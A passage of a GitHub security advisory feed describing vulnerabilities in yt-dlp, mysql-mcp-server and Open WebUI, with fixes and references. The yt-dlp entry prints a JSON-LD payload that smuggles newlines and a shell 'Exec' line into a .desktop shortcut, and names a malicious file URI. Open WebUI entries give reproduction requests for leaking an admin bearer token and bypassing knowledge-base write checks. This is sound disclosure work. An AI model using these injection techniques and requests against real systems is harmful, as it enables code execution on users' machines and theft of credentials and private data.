            <uri>https://github.com/advisories/GHSA-qg3f-8x3j-ggf2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T20:49:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[yt-dlp] yt-dlp: Downstream command injection via improper sanitization of yt-dlp --write-link output]]></title>
        <id>https://github.com/advisories/GHSA-6v4j-43gg-vj32</id>
        <link href="https://github.com/advisories/GHSA-6v4j-43gg-vj32"/>
        <updated>2026-07-24T20:35:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If the <code>--write-link</code>, <code>--write-url-link</code> or <code>--write-desktop-link</code> options are used with yt-dlp, it may produce output that can lead to downstream remote code execution. An attacker can craft a malicious metadata payload to achieve arbitrary command injection in the <code>.url</code> and <code>.desktop</code> shortcut files written by yt-dlp. This allows for malicious shell commands or malicious remote executables to run on the user's system if the user executes the generated <code>.url</code> or <code>.desktop</code> files.</p>
<h3 id="details">Details</h3>
<p>The expected result of yt-dlp's <code>--write-link</code>, <code>--write-url-link</code> and <code>--write-desktop-link</code> options is to write a shortcut file that points to the webpage URL for the content downloaded by yt-dlp. The <code>--write-url-link</code> option writes a <code>.url</code> shortcut file for Windows, the <code>--write-desktop-link</code> option writes a <code>.desktop</code> shortcut file for Linux, and the <code>--write-link</code> option may write a <code>.url</code> file or a <code>.desktop</code> file depending on the user's platform.</p>
<p>There are two known scenarios where a remote attacker could serve a malicious metadata payload to exploit yt-dlp's improper validation/sanitization of its shortcut output and achieve arbitrary code execution if the user later opens these files.</p>
<h4 id="scenario-1-file-uri-injection-in-windows-url-shortcut">Scenario 1: <code>file://</code> URI injection in Windows <code>.url</code> shortcut</h4>
<p>If a yt-dlp user passes the <code>--write-link</code> or <code>--write-url-link</code> option to generate a Windows <code>.url</code> file, the URL written to the shortcut file is sourced from the downloaded media's metadata--specifically, its <code>webpage_url</code> value. This value is commonly a normalized version of the input URL passed to yt-dlp by the user, but in some cases it may be extracted from untrusted web input. Validation of this <code>webpage_url</code> value is performed if it is fed back to yt-dlp as an input URL (e.g. via the <code>--load-info-json</code> option), but no validation is performed before it is output to a <code>.url</code> shortcut file.</p>
<p>This lack of validation is exploitable by a remote attacker who crafts a malicious metadata payload such that the resulting <code>webpage_url</code> value is a <code>file://</code> URI. A malicious file URI could point to a remote executable, e.g. <code>file://example.org/pwned.exe</code>. If a Windows user double-clicks a <code>.url</code> file that points to this <code>webpage_url</code>, Windows will execute the malicious remote executable on the user's system.</p>
<h4 id="scenario-2-shell-command-injection-in-linux-desktop-shortcut">Scenario 2: Shell command injection in Linux <code>.desktop</code> shortcut</h4>
<p>The Linux <code>.desktop</code> file format is a more versatile than the Windows <code>.url</code> file format. It is defined by the freedesktop.org "desktop entry" file specification, and supports multiple types of shortcuts: a <code>Link</code> type for URLs, a <code>Directory</code> type for filesystem folders, and an <code>Application</code> type for programs or shell commands. yt-dlp outputs a desktop entry file of the <code>Link</code> type, using the template below:</p>
<pre><code class="language-desktop">[Desktop Entry]
Encoding=UTF-8
Name=%(filename)s
Type=Link
URL=%(url)s
Icon=text-html
</code></pre>
<p>The keys under the <code>[Desktop Entry]</code> group are separated by newlines, and the type of desktop entry is set by the value paired to the <code>Type</code> key.</p>
<p>If a yt-dlp user passes the <code>--write-link</code> or <code>--write-desktop-link</code> option to generate a desktop entry file, in addition to the <code>webpage_url</code> value there is a <code>filename</code> value that is written to the shortcut file. By default, yt-dlp will sanitize the <code>filename</code> value: this sanitization includes replacing newlines with spaces and removing other control characters. However, the <code>--no-windows-filenames</code> option was modified in yt-dlp version 2024.12.23 to disable this default filename sanitization when used. </p>
<p>If the user passes <code>--write-link</code> or <code>--write-desktop-link</code> together with <code>--no-windows-filenames</code> to yt-dlp, an unsanitized <code>filename</code> value can be written to the resulting desktop entry file. A remote attacker can exploit this lack of sanitization by crafting a malicious metadata payload such that the resulting <code>filename</code> value contains newline characters, which can be used to inject arbitrary groups, keys and values into the desktop entry output. Doing so allows the attacker to change the <code>Type</code> of the desktop entry to <code>Application</code> and achieve shell command injection.</p>
<p>For example, an attacker-controlled website could serve a webpage with this maliciously crafted JSON-LD data:</p>
<pre><code class="language-html">&lt;html&gt;
&lt;script type="application/ld+json"&gt;{
    "@context": "https://schema.org",
    "@type": "VideoObject",
    "name":"Stream\nType=Application\nExec=sh -c &amp;quot;touch /tmp/pwned&amp;quot;\n\n[newgroup]\nName=endtitle",
    "contentUrl": "https://example.org/video.mp4"
}&lt;/script&gt;
&lt;/html&gt;
</code></pre>
<p>Then, a yt-dlp user could try to download the legitimate video content from the page by running the following command:</p>
<pre><code class="language-bash">yt-dlp --write-desktop-link --no-windows-filenames "https://example.org/123"
</code></pre>
<p>Which would result in a desktop entry file containing a malicious shell command:</p>
<pre><code class="language-desktop">[Desktop Entry]
Encoding=UTF-8
Name=Stream
Type=Application
Exec=sh -c "touch /tmp/pwned"

[newgroup]
Name=endtitle [123]
Type=Link
URL=%(url)s
Icon=text-html
</code></pre>
<p>If a user on a Linux desktop environment executes the generated <code>.desktop</code> file, the malicious shell command would run on the user's system. (In the above example, a <code>/tmp/pwned</code> file would be created in the user's filesystem.)</p>
<h3 id="patches">Patches</h3>
<p>yt-dlp version 2026.07.04 fixes this issue by validating the URL scheme before any shortcut file is written, and by properly sanitizing all desktop entry values written to the <code>.desktop</code> file generated from using the <code>--write-desktop-link</code> or <code>--write-link</code> options. (Most notably: newline characters are replaced by their proper escape sequence per the freedesktop.org desktop entry specification.)</p>
<h3 id="workarounds">Workarounds</h3>
<p>It is recommended to upgrade yt-dlp to version 2026.07.04 as soon as possible.</p>
<p>Users who are not able to upgrade should avoid using any of the <code>--write-link</code>, <code>--write-url-link</code> or <code>--write-desktop-link</code> options.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-6v4j-43gg-vj32">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-6v4j-43gg-vj32</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55404">https://nvd.nist.gov/vuln/detail/CVE-2026-55404</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/commit/6fc85f617a5850307fd5b258477070e6ee177796">https://github.com/yt-dlp/yt-dlp/commit/6fc85f617a5850307fd5b258477070e6ee177796</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/commit/b6590aaa1e3808155d69c9a79a797ae484163789">https://github.com/yt-dlp/yt-dlp/commit/b6590aaa1e3808155d69c9a79a797ae484163789</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp-nightly-builds/releases/tag/2026.07.04.221833">https://github.com/yt-dlp/yt-dlp-nightly-builds/releases/tag/2026.07.04.221833</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/releases/tag/2026.07.04">https://github.com/yt-dlp/yt-dlp/releases/tag/2026.07.04</a></li>
<li><a href="https://github.com/advisories/GHSA-6v4j-43gg-vj32">https://github.com/advisories/GHSA-6v4j-43gg-vj32</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6v4j-43gg-vj32</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T20:35:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mysql-mcp-server] MySQL MCP Server is Vulnerable to SQL Injection Through its mysql URI Handler]]></title>
        <id>https://github.com/advisories/GHSA-mvq4-39wx-6h5g</id>
        <link href="https://github.com/advisories/GHSA-mvq4-39wx-6h5g"/>
        <updated>2026-07-24T20:34:46.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was determined in designcomputer mysql-mcp-server up to 0.2.2. The impacted element is the function read_resource of the file src/mysql_mcp_server/server.py of the component mysql URI Handler. This manipulation of the argument uri_str causes sql injection. Remote exploitation of the attack is possible. The exploit has been publicly disclosed and may be utilized. Upgrading to version 0.3.0 is sufficient to resolve this issue. Patch name: 080bef9a96d625ce0dfbde573a08b93497871981. Upgrading the affected component is advised.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-11529">https://nvd.nist.gov/vuln/detail/CVE-2026-11529</a></li>
<li><a href="https://github.com/designcomputer/mysql_mcp_server/issues/89">https://github.com/designcomputer/mysql_mcp_server/issues/89</a></li>
<li><a href="https://github.com/designcomputer/mysql_mcp_server/pull/86">https://github.com/designcomputer/mysql_mcp_server/pull/86</a></li>
<li><a href="https://github.com/designcomputer/mysql_mcp_server/commit/080bef9a96d625ce0dfbde573a08b93497871981">https://github.com/designcomputer/mysql_mcp_server/commit/080bef9a96d625ce0dfbde573a08b93497871981</a></li>
<li><a href="https://github.com/designcomputer/mysql_mcp_server/releases/tag/v0.3.0">https://github.com/designcomputer/mysql_mcp_server/releases/tag/v0.3.0</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-11529">https://vuldb.com/cve/CVE-2026-11529</a></li>
<li><a href="https://vuldb.com/submit/836490">https://vuldb.com/submit/836490</a></li>
<li><a href="https://vuldb.com/vuln/369146">https://vuldb.com/vuln/369146</a></li>
<li><a href="https://vuldb.com/vuln/369146/cti">https://vuldb.com/vuln/369146/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-mvq4-39wx-6h5g">https://github.com/advisories/GHSA-mvq4-39wx-6h5g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mvq4-39wx-6h5g</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-08T18:31:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: /api/v1/channels/{id}/members exposes full user model including sensitive credentials]]></title>
        <id>https://github.com/advisories/GHSA-gh7p-78x6-jw6m</id>
        <link href="https://github.com/advisories/GHSA-gh7p-78x6-jw6m"/>
        <updated>2026-07-24T17:04:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The channel members endpoint serializes and returns <strong>full user models</strong> for channel participants, including settings objects. A normal user in a DM can retrieve admin-only sensitive configuration such as webhook URLs and tool server key material (<code>settings.ui.toolServers[].key</code>), which is not available via standard user info APIs.</p>
<h3 id="details">Details</h3>
<p>The endpoint GET <code>/api/v1/channels/{id}/members</code> returns the full serialized user model for every member in the channel. In both the DM and non-DM code paths, the handler constructs the response with <code>[UserModelResponse(**user.model_dump(), is_active=...)]</code> and returns it as the users list. Because <code>UserModel</code> (<code>models/users.py</code>) includes a settings object (<code>UserSettings</code>) and arbitrary UI configuration (<code>settings.ui</code>), the endpoint exposes other users' sensitive configuration to any channel participant.</p>
<p>Practically, a regular user who participates in a DM or group can call <code>/api/v1/channels/{id}/members</code> and receive other members' settings, including admin-only details such as webhook notification URLs and tool server configuration, including credential fields like <code>settings.ui.toolServers[].key</code>. These values are not returned by the normal user profile endpoints (e.g., <code>/api/v1/users/{user_id}/info</code>).</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Start a local Open WebUI instance</li>
<li>Log in as admin and in the Admin Panel, go to Settings -&gt; General and check <em>Channels (Beta)</em>, then press Save.</li>
<li>Create a low-privilege user in the Users tab</li>
<li>Click on the admin's profile bottom left, Settings and Integrations. Then click the <code>+</code> after <em>Manage Tool Servers</em> to add some tool server with a secret Bearer token (eg. <code>KEY</code>)</li>
<li>Log in as the attacker with the low-privilege account and create a new Direct Message channel with the admin user:</li>
</ol>
<img width="690" height="383" alt="image" src="https://github.com/user-attachments/assets/70208661-a0db-4457-9984-119056ca3daf">

<ol start="7">
<li>After creating, open DevTools with F12 and go to the Network tab. Then in the DM UI click on the <em>Users</em> icon top right to see the members. In the network tab, this should have triggered a <code>/api/v1/channels/{id}/members</code> request which responds with the <code>settings</code> key including <code>toolServers</code> and <code>key</code> values:</li>
</ol>
<img width="1642" height="577" alt="image" src="https://github.com/user-attachments/assets/6639d982-a156-4e8b-861e-587d86d9b152">

<p>The attacker has now leaked the admin's bearer token for the toolserver they configured.</p>
<h3 id="impact">Impact</h3>
<p>Conditions for exploit: channels are enabled and an attacker has a low-privilege account.</p>
<p>Webhook URLs and tool server configurations (including bearer keys) can be exfiltrated from any user.</p>
<h3 id="original-agent-report">Original Agent Report</h3>
<img width="400" alt="app aikido dev_ai-pentests_projects_116389_assessments_019d67d4-81c8-7dd2-bb9e-0a4a774b2c78_issues_sidebarIssue=20440423 (4)" src="https://github.com/user-attachments/assets/8415553a-9f1e-4f73-929c-aa0d18a101ca">
### References

<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-gh7p-78x6-jw6m">https://github.com/open-webui/open-webui/security/advisories/GHSA-gh7p-78x6-jw6m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59222">https://nvd.nist.gov/vuln/detail/CVE-2026-59222</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/fbcdcf146b99b5002705060a8243eee769108f9e">https://github.com/open-webui/open-webui/commit/fbcdcf146b99b5002705060a8243eee769108f9e</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-gh7p-78x6-jw6m">https://github.com/advisories/GHSA-gh7p-78x6-jw6m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gh7p-78x6-jw6m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T17:04:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Private channel messages can be disclosed through cross-channel thread parent_id binding]]></title>
        <id>https://github.com/advisories/GHSA-73x5-h92w-xc2j</id>
        <link href="https://github.com/advisories/GHSA-73x5-h92w-xc2j"/>
        <updated>2026-07-24T17:04:32.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A normal authenticated user can read the content of a message in a private channel they do not belong to. <code>GET /api/v1/channels/{id}/messages/{message_id}/thread</code> authorizes the caller against the URL channel, but the underlying thread lookup loads the thread <em>parent</em> by id and returns it without verifying the parent belongs to that channel. By requesting a thread in a channel they can access while supplying a victim channel's message id as the thread root, the attacker receives the victim message — content, channel id, and author.</p>
<h2 id="affected-component">Affected component</h2>
<ul>
<li><code>backend/open_webui/models/messages.py</code> — <code>get_messages_by_parent_id()</code></li>
<li><code>backend/open_webui/routers/channels.py</code> — <code>get_channel_thread_messages()</code> (read), <code>new_message_handler()</code> (parent/reply binding on write)</li>
</ul>
<h2 id="root-cause">Root cause</h2>
<p><code>get_messages_by_parent_id(channel_id, parent_id)</code> filters the thread <em>replies</em> by <code>channel_id</code>, but loads the thread <em>parent</em> by id alone and appends it without requiring <code>parent.channel_id == channel_id</code>:</p>
<pre><code class="language-python">message = await db.get(Message, parent_id)     # loaded by id only — no channel binding
if not message:
    return []
# replies are filtered by channel_id ...
if len(all_messages) &lt; limit:
    all_messages.append(message)               # parent appended unconditionally
</code></pre>
<p><code>get_channel_thread_messages()</code> authorizes only the URL channel, then calls <code>get_messages_by_parent_id(id, message_id)</code> with the caller-supplied <code>message_id</code>. The reply insert path (<code>new_message_handler</code> → <code>insert_new_message</code>) also stored a caller-supplied <code>parent_id</code> without binding it to the channel.</p>
<h2 id="impact">Impact</h2>
<p>A non-member can disclose the content (plus channel id and author metadata) of a private-channel message whose id they know or obtain. Direct reads of the victim channel/message/thread return 403; the disclosure is via the thread parent of a channel the attacker can access. Read-only, one message per known id.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>(reporter) Validated on v0.9.6: <code>GET /channels/{attacker_channel}/messages/{victim_message_id}/thread</code> returned the victim's private message — content, victim channel id, and author — although direct reads of the victim channel returned 403.</p>
<h2 id="fix">Fix</h2>
<p>Bind the thread parent to the requested channel: <code>get_messages_by_parent_id</code> returns <code>[]</code> unless the parent exists and <code>parent.channel_id == channel_id</code>. Defence-in-depth on the write path: <code>new_message_handler</code> rejects a supplied <code>parent_id</code>/<code>reply_to_id</code> whose message does not belong to the URL channel.</p>
<h2 id="affected--patched">Affected / Patched</h2>
<ul>
<li>Affected: <code>&lt; 0.10.0</code> (last affected release 0.9.6)</li>
<li>Patched: v0.10.0 (PR #25766). <code>get_messages_by_parent_id</code> binds the thread parent to the requested channel (returns <code>[]</code> unless <code>parent.channel_id == channel_id</code>), and <code>new_message_handler</code> rejects a caller-supplied <code>parent_id</code>/<code>reply_to_id</code> whose message does not belong to the channel.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-73x5-h92w-xc2j">https://github.com/open-webui/open-webui/security/advisories/GHSA-73x5-h92w-xc2j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59215">https://nvd.nist.gov/vuln/detail/CVE-2026-59215</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/25766">https://github.com/open-webui/open-webui/pull/25766</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/a66477b7104c5d141ce7bffaea424b43e7666ef1">https://github.com/open-webui/open-webui/commit/a66477b7104c5d141ce7bffaea424b43e7666ef1</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-73x5-h92w-xc2j">https://github.com/advisories/GHSA-73x5-h92w-xc2j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-73x5-h92w-xc2j</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-07-24T17:04:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Cross-user model-list exposure via static cache key in get_all_models (aiocache key= vs key_builder= misuse)]]></title>
        <id>https://github.com/advisories/GHSA-3wp3-xxj9-5jqq</id>
        <link href="https://github.com/advisories/GHSA-3wp3-xxj9-5jqq"/>
        <updated>2026-07-24T17:03:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>get_all_models</code> handlers in <code>routers/openai.py</code> and <code>routers/ollama.py</code> intended to cache their <strong>permission-filtered</strong> model lists per user, but the <code>@cached</code> decorator was misconfigured: it passed a <code>key=</code> lambda instead of <code>key_builder=</code>. In aiocache 0.12.3 (the pinned version), <code>key=</code> is a <strong>static</strong> cache key — a callable passed there is used as a constant object, not invoked per call. As a result the per-user key was never computed, and all callers collided onto a single shared cache entry within the TTL window. During that window, one user's permission-filtered model list could be served to a different authenticated user, crossing the per-user authorization boundary.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Boundary crossed:</strong> Confidentiality (cross-user). A caller can receive the model list scoped to a <em>different</em> security principal than themselves.</li>
<li>A user (or admin, or — depending on endpoint reachability — anonymous caller) who populates the cache causes the next caller within the TTL to receive <em>that</em> list rather than their own permission-filtered one.</li>
<li>What's disclosed is the set of models another principal can access, including potentially the existence and naming of models restricted from the receiving user.</li>
<li>Exposure is <strong>incidental and timing-dependent</strong>, not attacker-controlled: the leaked entry is whatever the most recent caller populated within <code>MODELS_CACHE_TTL</code> (default 1 second), and the attacker cannot select the victim or force a target's list into the cache.</li>
</ul>
<h2 id="affected-component">Affected component</h2>
<ul>
<li><code>backend/open_webui/routers/openai.py</code> — <code>get_all_models</code> (~line 488)</li>
<li><code>backend/open_webui/routers/ollama.py</code> — <code>get_all_models</code> (~line 302)</li>
</ul>
<p>Both decorated with <code>@cached(ttl=MODELS_CACHE_TTL, key=lambda ...)</code>. No other <code>@cached(... key=lambda ...)</code> misuse was found elsewhere in the backend.</p>
<h2 id="root-cause">Root cause</h2>
<p>aiocache 0.12's <code>@cached</code> treats <code>key=</code> as a static key; the per-call hook is <code>key_builder=</code> with signature <code>key_builder(func, *args, **kwargs)</code>. Passing a callable to <code>key=</code> uses the callable object itself as a constant key, so every invocation resolved to the same entry and the intended per-<code>user.id</code> namespacing never occurred.</p>
<h2 id="reproduction-default-config">Reproduction (default config)</h2>
<ol>
<li>On a default deployment, configure at least two users with <em>different</em> model-access permissions (e.g. one model restricted to user A).</li>
<li>As user A, request the model list (populates the shared cache entry).</li>
<li>Within <code>MODELS_CACHE_TTL</code> (default 1s), as user B, request the model list.</li>
<li>User B receives user A's permission-filtered list, including models B is not permitted to see.</li>
</ol>
<h2 id="remediation">Remediation</h2>
<p>Replace <code>key=</code> with <code>key_builder=</code> at both call sites and adjust the lambda to take the function as its first argument:</p>
<pre><code class="language-python">@cached(
    ttl=MODELS_CACHE_TTL,
    key_builder=lambda _func, request, user=None: (
        f'openai_all_models_{user.id}' if user else 'openai_all_models'
    ),
)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-3wp3-xxj9-5jqq">https://github.com/open-webui/open-webui/security/advisories/GHSA-3wp3-xxj9-5jqq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59213">https://nvd.nist.gov/vuln/detail/CVE-2026-59213</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/25783">https://github.com/open-webui/open-webui/pull/25783</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/0fc630b34b2899599dabffffa012afd47599aa75">https://github.com/open-webui/open-webui/commit/0fc630b34b2899599dabffffa012afd47599aa75</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-3wp3-xxj9-5jqq">https://github.com/advisories/GHSA-3wp3-xxj9-5jqq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3wp3-xxj9-5jqq</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-07-24T17:03:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Upload `metadata.knowledge_id` bypasses the knowledge-base write-access check (read-only users can add files to KB)]]></title>
        <id>https://github.com/advisories/GHSA-7r7x-gjvr-448g</id>
        <link href="https://github.com/advisories/GHSA-7r7x-gjvr-448g"/>
        <updated>2026-07-24T17:02:15.000Z</updated>
        <content type="html"><![CDATA[<h1 id="open-webui-upload-metadata-can-add-files-to-knowledge-bases-without-write-permission">Open WebUI upload metadata can add files to knowledge bases without write permission</h1>
<h2 id="summary">Summary</h2>
<p>Open WebUI's file upload background processing trusts the client-supplied <code>metadata.knowledge_id</code> value and inserts a <code>knowledge_file</code> association before validating that the uploading user has write access to the target knowledge base.</p>
<p>A verified user with only read access to a knowledge base can upload an arbitrary file and set <code>metadata={"knowledge_id":"&lt;target knowledge id&gt;"}</code>. The normal <code>/api/v1/knowledge/{id}/file/add</code> endpoint correctly requires knowledge-base write access, but the upload auto-link path bypasses that authorization check.</p>
<p>The immediate result is unauthorized modification of the target knowledge base's file membership. The attached attacker-controlled file becomes visible through <code>/api/v1/knowledge/{id}/files</code>, and readers/owners of that knowledge base can retrieve the file through the normal file endpoints because file access is derived from <code>KnowledgeFile</code> membership.</p>
<h2 id="affected-version">Affected Version</h2>
<ul>
<li>Repository: <code>open-webui/open-webui</code></li>
<li>Tested source commit: <code>02dc3e689ceac915a870b373318b99c029ddf603</code></li>
<li>Package version observed in <code>package.json</code>: <code>0.9.6</code></li>
<li>Package name: <code>open-webui</code></li>
</ul>
<h2 id="impact">Impact</h2>
<p>A read-only knowledge-base collaborator can perform a write operation against that knowledge base by attaching arbitrary uploaded files.</p>
<p>Security impact:</p>
<ul>
<li>Unauthorized knowledge-base membership modification.</li>
<li>Integrity impact on shared knowledge-base file listings.</li>
<li>Attacker-controlled files become readable to other users who can read the target knowledge base.</li>
<li>If an owner/admin later reprocesses or globally reindexes the knowledge base, the unauthorized file can be indexed into the knowledge collection, turning the membership bypass into RAG/content poisoning.</li>
</ul>
<p>This is not an unauthenticated issue. It requires a verified Open WebUI account and a valid target knowledge-base ID. The clearest exploit path is a user who legitimately has read access to a knowledge base but not write access.</p>
<h2 id="source-evidence">Source Evidence</h2>
<p>The normal single-file knowledge add endpoint checks write permission before processing or inserting the relationship:</p>
<ul>
<li><code>backend/open_webui/routers/knowledge.py</code></li>
<li><code>add_file_to_knowledge_by_id</code></li>
<li>Lines 714-728 reject callers who are not owner, admin, or granted <code>write</code> access.</li>
<li>Lines 750-766 then process and insert the file only after that authorization gate.</li>
</ul>
<p>The upload auto-link path does not perform the same check:</p>
<ul>
<li><code>backend/open_webui/routers/files.py</code></li>
<li><code>process_uploaded_file</code></li>
<li>Lines 178-186 read <code>knowledge_id</code> from upload metadata and immediately call <code>Knowledges.add_file_to_knowledge_by_id(...)</code>.</li>
<li>Lines 187-192 call <code>process_file(... collection_name=knowledge_id ...)</code> after the insert.</li>
</ul>
<p>The model method inserts the relationship without validating the caller's write access to the knowledge base:</p>
<ul>
<li><code>backend/open_webui/models/knowledge.py</code></li>
<li><code>add_file_to_knowledge_by_id</code></li>
<li>Lines 646-677 create and commit a <code>KnowledgeFile</code> row for the supplied <code>knowledge_id</code>, <code>file_id</code>, and <code>user_id</code>.</li>
</ul>
<p>The later vector write check exists, but it runs too late:</p>
<ul>
<li><code>backend/open_webui/routers/retrieval.py</code></li>
<li><code>process_file</code></li>
<li>Lines 1587-1592 call <code>_validate_collection_access(..., access_type='write')</code> when a collection is supplied.</li>
</ul>
<p>Because the unauthorized <code>KnowledgeFile</code> row is already committed before that check runs, the failed vector processing does not undo the knowledge-base file association. The upload code catches the exception at <code>backend/open_webui/routers/files.py</code> lines 194-195 and logs a warning while leaving the row in place.</p>
<p>The unauthorized relationship affects file access decisions:</p>
<ul>
<li><code>backend/open_webui/utils/access_control/files.py</code></li>
<li><code>has_access_to_file</code></li>
<li>Lines 41-53 grant file access when a file is associated with a knowledge base the user can access.</li>
</ul>
<p>So once the attacker's file is inserted into the target <code>KnowledgeFile</code> table, target knowledge-base readers/owners can see and fetch that file through normal knowledge/file routes.</p>
<h2 id="reproduction-steps">Reproduction Steps</h2>
<p>Use a local Open WebUI instance with two verified users:</p>
<ol>
<li>As user <code>owner</code>, create a knowledge base.</li>
<li>Grant user <code>reader</code> read access to the knowledge base, but do not grant write access.</li>
<li>As <code>reader</code>, confirm the normal add-file endpoint is blocked:</li>
</ol>
<pre><code class="language-http">POST /api/v1/knowledge/&lt;knowledge_id&gt;/file/add
Authorization: Bearer &lt;reader token&gt;
Content-Type: application/json

{"file_id":"&lt;reader-owned-file-id&gt;"}
</code></pre>
<p>Expected and observed behavior for the normal route: it rejects the request because <code>reader</code> lacks knowledge-base write access.</p>
<ol start="4">
<li>As <code>reader</code>, upload a new file with the same target knowledge ID embedded in upload metadata:</li>
</ol>
<pre><code class="language-http">POST /api/v1/files/?process=true&amp;process_in_background=false
Authorization: Bearer &lt;reader token&gt;
Content-Type: multipart/form-data

file=@attacker-note.txt
metadata={"knowledge_id":"&lt;knowledge_id&gt;"}
</code></pre>
<ol start="5">
<li>Observe that the upload request succeeds and returns the uploaded file record.</li>
<li>As <code>owner</code>, request the knowledge-base files:</li>
</ol>
<pre><code class="language-http">GET /api/v1/knowledge/&lt;knowledge_id&gt;/files
Authorization: Bearer &lt;owner token&gt;
</code></pre>
<ol start="7">
<li>Observe that <code>attacker-note.txt</code> appears in the target knowledge base even though <code>reader</code> did not have write access.</li>
<li>As <code>owner</code>, request the file content:</li>
</ol>
<pre><code class="language-http">GET /api/v1/files/&lt;attacker_file_id&gt;/content
Authorization: Bearer &lt;owner token&gt;
</code></pre>
<ol start="9">
<li>Observe that the file is retrievable because <code>has_access_to_file</code> derives access from the unauthorized knowledge-base membership.</li>
</ol>
<h2 id="expected-behavior">Expected Behavior</h2>
<p>The upload auto-link path should enforce the same authorization contract as <code>/api/v1/knowledge/{id}/file/add</code>:</p>
<ul>
<li>The target knowledge base must exist.</li>
<li>The caller must be the knowledge owner, an admin, or have <code>write</code> access.</li>
<li>The supplied <code>directory_id</code>, if present, must belong to the target knowledge base.</li>
<li>The <code>KnowledgeFile</code> association should only be inserted after authorization and processing succeed.</li>
</ul>
<h2 id="actual-behavior">Actual Behavior</h2>
<p><code>metadata.knowledge_id</code> causes <code>Knowledges.add_file_to_knowledge_by_id(...)</code> to insert a <code>KnowledgeFile</code> row before write authorization is checked. The later collection write validation can fail, but the unauthorized membership row remains committed.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Move knowledge-base authorization before the insert in the upload auto-link path. The upload path should share the same write-access and directory validation logic used by the dedicated knowledge endpoints.</p>
<p>One safe pattern:</p>
<ol>
<li>Load the target knowledge base.</li>
<li>Require owner/admin/write access before calling <code>Knowledges.add_file_to_knowledge_by_id</code>.</li>
<li>Validate that <code>directory_id</code>, if supplied, belongs to the same knowledge base.</li>
<li>Run vector processing before inserting the membership row, or wrap processing plus insertion in a transaction/compensating cleanup so a denied or failed process cannot leave a stale unauthorized row.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-7r7x-gjvr-448g">https://github.com/open-webui/open-webui/security/advisories/GHSA-7r7x-gjvr-448g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59217">https://nvd.nist.gov/vuln/detail/CVE-2026-59217</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/26001">https://github.com/open-webui/open-webui/pull/26001</a></li>
